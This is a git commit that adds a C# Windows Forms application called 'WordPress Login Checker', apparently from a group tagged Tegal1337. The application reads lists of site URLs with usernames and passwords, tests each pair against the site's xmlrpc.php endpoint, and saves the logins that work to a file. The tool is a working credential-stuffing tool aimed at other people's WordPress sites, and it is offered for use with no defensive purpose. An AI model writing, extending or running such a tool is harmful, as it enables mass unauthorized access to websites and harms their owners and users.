152150ac5f257412079e888fbed50b3a7d44eb34
fdciabdul <abdulmuttaqin456@gmail.com>
2024-05-26 16:25:05 +0700

    push

---
+++ Form1.Designer.cs
@@ -0,0 +1,161 @@
+﻿namespace WordPressLoginChecker
+{
+    partial class Form1
+    {
+        private System.ComponentModel.IContainer components = null;
+        private System.Windows.Forms.Button btnBrowse;
+        private System.Windows.Forms.TextBox txtFilePath;
+        private System.Windows.Forms.Button btnCheckLogins;
+        private System.Windows.Forms.Button btnStop;
+        private System.Windows.Forms.RichTextBox txtOutput;
+        private System.Windows.Forms.TextBox txtOutputFileName;
+        private System.Windows.Forms.Button btnBrowseSaveLocation;
+        private System.Windows.Forms.TextBox txtSaveLocation;
+
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        private void InitializeComponent()
+        {
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            btnBrowse = new Button();
+            txtFilePath = new TextBox();
+            btnCheckLogins = new Button();
+            btnStop = new Button();
+            txtOutput = new RichTextBox();
+            txtOutputFileName = new TextBox();
+            btnBrowseSaveLocation = new Button();
+            txtSaveLocation = new TextBox();
+            SuspendLayout();
+            // 
+            // btnBrowse
+            // 
+            btnBrowse.BackColor = Color.Black;
+            btnBrowse.FlatStyle = FlatStyle.Flat;
+            btnBrowse.ForeColor = Color.White;
+            btnBrowse.Location = new Point(467, 14);
+            btnBrowse.Margin = new Padding(4, 3, 4, 3);
+            btnBrowse.Name = "btnBrowse";
+            btnBrowse.Size = new Size(88, 27);
+            btnBrowse.TabIndex = 0;
+            btnBrowse.Text = "Browse...";
+            btnBrowse.UseVisualStyleBackColor = false;
+            btnBrowse.Click += btnBrowse_Click;
+            // 
+            // txtFilePath
+            // 
+            txtFilePath.BackColor = Color.Black;
+            txtFilePath.ForeColor = Color.White;
+            txtFilePath.Location = new Point(14, 14);
+            txtFilePath.Margin = new Padding(4, 3, 4, 3);
+            txtFilePath.Name = "txtFilePath";
+            txtFilePath.ReadOnly = true;
+            txtFilePath.Size = new Size(445, 23);
+            txtFilePath.TabIndex = 1;
+            // 
+            // btnCheckLogins
+            // 
+            btnCheckLogins.BackColor = Color.FromArgb(0, 192, 0);
+            btnCheckLogins.FlatStyle = FlatStyle.Flat;
+            btnCheckLogins.ForeColor = Color.White;
+            btnCheckLogins.Location = new Point(14, 44);
+            btnCheckLogins.Margin = new Padding(4, 3, 4, 3);
+            btnCheckLogins.Name = "btnCheckLogins";
+            btnCheckLogins.Size = new Size(540, 27);
+            btnCheckLogins.TabIndex = 2;
+            btnCheckLogins.Text = "Check Logins";
+            btnCheckLogins.UseVisualStyleBackColor = false;
+            btnCheckLogins.Click += btnCheckLogins_Click;
+            // 
+            // btnStop
+            // 
+            btnStop.BackColor = Color.Red;
+            btnStop.FlatStyle = FlatStyle.Flat;
+            btnStop.ForeColor = Color.White;
+            btnStop.Location = new Point(14, 77);
+            btnStop.Margin = new Padding(4, 3, 4, 3);
+            btnStop.Name = "btnStop";
+            btnStop.Size = new Size(540, 27);
+            btnStop.TabIndex = 3;
+            btnStop.Text = "Stop";
+            btnStop.UseVisualStyleBackColor = false;
+            btnStop.Click += btnStop_Click;
+            // 
+            // txtOutput
+            // 
+            txtOutput.BackColor = Color.Black;
+            txtOutput.DetectUrls = false;
+            txtOutput.ForeColor = Color.Lime;
+            txtOutput.Location = new Point(14, 111);
+            txtOutput.Margin = new Padding(4, 3, 4, 3);
+            txtOutput.Name = "txtOutput";
+            txtOutput.ScrollBars = RichTextBoxScrollBars.Vertical;
+            txtOutput.Size = new Size(540, 406);
+            txtOutput.TabIndex = 4;
+            txtOutput.Text = "";
+            // 
+            // txtOutputFileName
+            // 
+            txtOutputFileName.BackColor = Color.Black;
+            txtOutputFileName.ForeColor = Color.White;
+            txtOutputFileName.Location = new Point(14, 524);
+            txtOutputFileName.Margin = new Padding(4, 3, 4, 3);
+            txtOutputFileName.Name = "txtOutputFileName";
+            txtOutputFileName.Size = new Size(445, 23);
+            txtOutputFileName.TabIndex = 5;
+            txtOutputFileName.Text = "successful_logins.txt";
+            // 
+            // btnBrowseSaveLocation
+            // 
+            btnBrowseSaveLocation.BackColor = Color.Black;
+            btnBrowseSaveLocation.FlatStyle = FlatStyle.Flat;
+            btnBrowseSaveLocation.ForeColor = Color.White;
+            btnBrowseSaveLocation.Location = new Point(467, 554);
+            btnBrowseSaveLocation.Margin = new Padding(4, 3, 4, 3);
+            btnBrowseSaveLocation.Name = "btnBrowseSaveLocation";
+            btnBrowseSaveLocation.Size = new Size(88, 27);
+            btnBrowseSaveLocation.TabIndex = 7;
+            btnBrowseSaveLocation.Text = "Browse...";
+            btnBrowseSaveLocation.UseVisualStyleBackColor = false;
+            btnBrowseSaveLocation.Click += btnBrowseSaveLocation_Click;
+            // 
+            // txtSaveLocation
+            // 
+            txtSaveLocation.BackColor = Color.Black;
+            txtSaveLocation.ForeColor = Color.White;
+            txtSaveLocation.Location = new Point(14, 554);
+            txtSaveLocation.Margin = new Padding(4, 3, 4, 3);
+            txtSaveLocation.Name = "txtSaveLocation";
+            txtSaveLocation.ReadOnly = true;
+            txtSaveLocation.Size = new Size(445, 23);
+            txtSaveLocation.TabIndex = 6;
+            // 
+            // Form1
+            // 
+            AutoScaleDimensions = new SizeF(7F, 15F);
+            AutoScaleMode = AutoScaleMode.Font;
+            BackColor = Color.Black;
+            ClientSize = new Size(568, 594);
+            Controls.Add(txtSaveLocation);
+            Controls.Add(btnBrowseSaveLocation);
+            Controls.Add(txtOutputFileName);
+            Controls.Add(txtOutput);
+            Controls.Add(btnStop);
+            Controls.Add(btnCheckLogins);
+            Controls.Add(txtFilePath);
+            Controls.Add(btnBrowse);
+            Icon = (Icon)resources.GetObject("$this.Icon");
+            Margin = new Padding(4, 3, 4, 3);
+            Name = "Form1";
+            Text = "WordPress Login Checker | Tegal1337";
+            ResumeLayout(false);
+            PerformLayout();
+        }
+    }
+}
---
+++ Form1.cs
@@ -0,0 +1,169 @@
+using System;
+using System.IO;
+using System.Linq;
+using System.Net.Http;
+using System.Text;
+using System.Text.RegularExpressions;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Xml.Linq;
+
+namespace WordPressLoginChecker
+{
+    public partial class Form1 : Form
+    {
+        private static readonly HttpClient client = new HttpClient();
+        private CancellationTokenSource cts;
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void btnBrowse_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog openFileDialog = new OpenFileDialog
+            {
+                Filter = "Text Files (*.txt)|*.txt|All Files (*.*)|*.*"
+            };
+
+            if (openFileDialog.ShowDialog() == DialogResult.OK)
+            {
+                txtFilePath.Text = openFileDialog.FileName;
+            }
+        }
+
+        private async void btnCheckLogins_Click(object sender, EventArgs e)
+        {
+            if (string.IsNullOrEmpty(txtFilePath.Text))
+            {
+                MessageBox.Show("Please select a file first.");
+                return;
+            }
+
+            if (string.IsNullOrEmpty(txtSaveLocation.Text) || string.IsNullOrEmpty(txtOutputFileName.Text))
+            {
+                MessageBox.Show("Please select the save location and specify the output file name.");
+                return;
+            }
+
+            cts = new CancellationTokenSource();
+            string[] lines = File.ReadAllLines(txtFilePath.Text);
+
+            try
+            {
+                await Task.Run(() =>
+                {
+                    foreach (string line in lines)
+                    {
+                        if (cts.Token.IsCancellationRequested)
+                            break;
+
+                        var match = Regex.Match(line, @"(https?:\/\/[^\s/]+\/(wp-login\.php|wp-admin)):([^:]+):([^:]+)");
+                        if (match.Success)
+                        {
+                            string url = match.Groups[1].Value;
+                            string username = match.Groups[3].Value;
+                            string password = match.Groups[4].Value;
+
+                            CheckLogin(url, username, password, cts.Token).Wait();
+                        }
+                    }
+                });
+            }
+            catch (OperationCanceledException)
+            {
+                AppendOutput("Operation was canceled.", true);
+            }
+        }
+
+        private void btnStop_Click(object sender, EventArgs e)
+        {
+            if (cts != null)
+            {
+                cts.Cancel();
+            }
+        }
+
+        private void btnBrowseSaveLocation_Click(object sender, EventArgs e)
+        {
+            FolderBrowserDialog folderBrowserDialog = new FolderBrowserDialog();
+
+            if (folderBrowserDialog.ShowDialog() == DialogResult.OK)
+            {
+                txtSaveLocation.Text = folderBrowserDialog.SelectedPath;
+            }
+        }
+
+        private async Task CheckLogin(string url, string username, string password, CancellationToken token)
+        {
+            string xmlRpcUrl = Regex.Replace(url, "(wp-login\\.php|wp-admin)$", "xmlrpc.php");
+            string xmlRequest = $@"
+                <?xml version=""1.0""?>
+                <methodCall>
+                    <methodName>wp.getUsersBlogs</methodName>
+                    <params>
+                        <param><value><string>{username}</string></value></param>
+                        <param><value><string>{password}</string></value></param>
+                    </params>
+                </methodCall>";
+
+            var content = new StringContent(xmlRequest, Encoding.UTF8, "text/xml");
+
+            try
+            {
+                HttpResponseMessage response = await client.PostAsync(xmlRpcUrl, content, token);
+                string responseContent = await response.Content.ReadAsStringAsync();
+
+                XDocument xmlResponse = XDocument.Parse(responseContent);
+
+                if (xmlResponse.Descendants("fault").Any())
+                {
+                    AppendOutput($"===============================\nLogin failed for {url} with user {username}\n===============================", true);
+                }
+                else
+                {
+                    AppendOutput($"===============================\nLogin successful for {url} with user {username}\n===============================", false);
+                    SaveSuccessfulLogin(url, username, password);
+                }
+            }
+            catch (Exception ex)
+            {
+                if (!token.IsCancellationRequested)
+                {
+                    AppendOutput($"===============================\nError checking login for {url}: {ex.Message}\n===============================", true);
+                }
+            }
+        }
+
+        private void SaveSuccessfulLogin(string url, string username, string password)
+        {
+            string successFilePath = Path.Combine(txtSaveLocation.Text, txtOutputFileName.Text);
+            string successEntry = $"{url}:{username}:{password}\n";
+            File.AppendAllText(successFilePath, successEntry);
+        }
+
+        private void AppendOutput(string text, bool isError)
+        {
+            if (isError)
+            {
+                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.Red));
+            }
+            else
+            {
+                txtOutput.Invoke((Action)(() => txtOutput.SelectionColor = System.Drawing.Color.LightGreen));
+            }
+
+            txtOutput.Invoke((Action)(() =>
+            {
+                txtOutput.AppendText(text + Environment.NewLine);
+                txtOutput.SelectionColor = System.Drawing.Color.Black;
+
+                // Auto-scroll to the bottom
+                txtOutput.SelectionStart = txtOutput.Text.Length;
+                txtOutput.ScrollToCaret();
+            }));
+        }
+    }
+}
